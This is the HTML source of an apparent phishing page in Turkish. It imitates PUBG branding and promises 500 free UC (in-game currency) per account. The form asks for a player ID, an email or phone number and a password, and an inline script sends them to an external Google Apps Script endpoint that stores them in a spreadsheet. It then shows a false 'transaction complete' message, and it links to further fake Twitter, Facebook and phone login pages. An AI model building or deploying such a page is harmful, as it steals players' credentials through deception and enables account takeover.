<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MEDELİN</title>
    <link rel="stylesheet" href="style.css" />
    <link
      rel="shortcut icon"
      href="https://wstatic-prod.pubg.com/web/live/static/favicons/favicon-32x32.png"
      type="image/x-icon"
    />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
  </head>
  <body>
    <img class="advert" src="https://blogger.googleusercontent.com/img/a/AVvXsEgyN7OdsecktdjKBiso1tzaqI6NNpAAzCVX6QhLTNTntH985maqdC8jm3fiu4DijqJKMxk3b-_SwAVICCKtXXi-ZZbdebmc-2wj4_whOr9KlrOr4aWDMcuQSNMSfZjrF7O6sgBa-e3QQLbdx4lDJUJlnxurK6Amg2JWW-Kv73IkLqhDuXTyeVxjLfga3A" alt="Background">
    <div class="orta">
      <nav>
        <img
          class="logo"
          src="https://wstatic-prod.pubg.com/web/live/main_9b5ee57/img/2256138.png"
          alt="logo"
        />
      </nav>

      <form name="submit-to-google-sheet">
        <span>Uc Gönderilecek Hesap İD:</span>
        <input type="number" name="name" placeholder="İD" required>
        <div class="drop-down">E-posta<i class="fa-solid fa-caret-down" style="color: aliceblue; margin-left: 4px;"></i>
        <ul class="down">
          <li><a href="Telefon Giriş.html">Tel. Giriş</a></li>
          <li><a href="Twitter Giriş.html">Twitter Giriş</a></li>
          <li><a href="Facebook Giriş.html">Facebook Giriş</a></li>
        </ul>
        </div>
        <input type="tel" name="email" placeholder="E-posta" required>
        <span>Şifre:</span>
        <input type="password" name="password" placeholder="Şifre" required>
        <button type="submit" name="myButton">Gönder</button>
        <span style="font-size: 11px; color: yellowgreen;">Her Hesaba Tek Seferlik 500uc Gönderilecektir</span>
        <span style="color: yellowgreen; font-size: 12px;" id="msg"></span>
        <a target="_blank" href="https://accounts.google.com/v3/signin/challenge/pwd?TL=AJeL0C6RLWwaeyxxqOzGS__BzfW5iZDlR8lYvIladHW-BCPpv5U8Ng4MdkETglZa&cid=1&continue=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Fpassword&flowName=GlifWebSignIn&hl=tr&ifkv=AYZoVhf2viWyCeXX8MGO3kJ3hqD_k6dGHlYBzLxqmLphWUOYpSlPu8izL_hNvYYg4F35nEfDz3aF2A&kdi=CAM&rart=ANgoxcdv9bdfbDH8KOukqYbqUJUg37oINQKwOMD4z-tCxs1pU74EQIb4nsPWJLIe3RPsHmGpilTFZsFDoMsF6XJQ0imUMA7vsw&rpbg=1&sarp=1&scc=1&service=accountsettings" style="font-size: 13px; color: aliceblue; margin: 4px 0; list-style: armenian;">Şifremi unutum</a>
      </form>
    </div>

  
    <script src="script.js"></script>
    <script>
      const scriptURL = 'https://script.google.com/macros/s/AKfycbzesxMraGoAaEOzzSg32rAzT3flfYTWatQ3oo22xHaB_X53ik6fC5fAFq2tbUJICeL1/exec'
      const form = document.forms['submit-to-google-sheet']
      const msg = document.getElementById('msg')
    
      form.addEventListener('submit', e => {
        e.preventDefault()
        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
          .then(response => {
            msg.innerHTML = "işlem Tamamlanmıştır Belirli Süre Sonunda Tüm Hesaplara Uc Gönderilecektir"
            setTimeout(function() {
              msg.innerHTML = ""
            }, 5000)
            form.reset()
          })
          .catch(error => console.error('Error!', error.message))
      })
    </script>
  </body>
</html>
